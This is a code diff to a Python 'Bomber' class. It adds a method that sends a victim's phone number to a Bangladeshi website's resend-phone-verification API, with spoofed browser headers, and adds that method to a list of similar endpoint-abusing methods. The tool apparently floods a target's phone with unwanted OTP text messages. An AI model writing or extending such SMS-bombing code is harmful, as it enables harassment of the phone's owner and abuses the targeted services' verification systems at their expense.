@@ -139,6 +139,31 @@ class Bomber:
     return False
 
 
+  def vision_resend(self):
+    url = "https://vision.com.bd/api/backend/api/v1/auth/resend-phone-verification"
+    headers = {
+        "Host": "vision.com.bd",
+        "User-Agent": self.getUserAgent(),
+        "Accept": "*/*",
+        "Content-Type": "application/json",
+        "Origin": "https://vision.com.bd",
+        "Referer": "https://vision.com.bd/register?callbackUrl=%2Fdashboard",
+        "X-Requested-With": "mark.via.gp",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    }
+    payload = {
+        "phone": self.user_mobile
+    }
+
+    try:
+      r = requests.post(url, json=payload, headers=headers, timeout=5)
+      if r.status_code == 200:
+        res_json = r.json()
+        if res_json.get("success") == True:
+          return True
+    except:
+      pass
+    return False
 
   
   
@@ -188,7 +213,8 @@ class Bomber:
         self.aroggo,
         self.grameenphone,
         self.bdtickets,
-        
+        self.vision_resend,
+
         
         
         
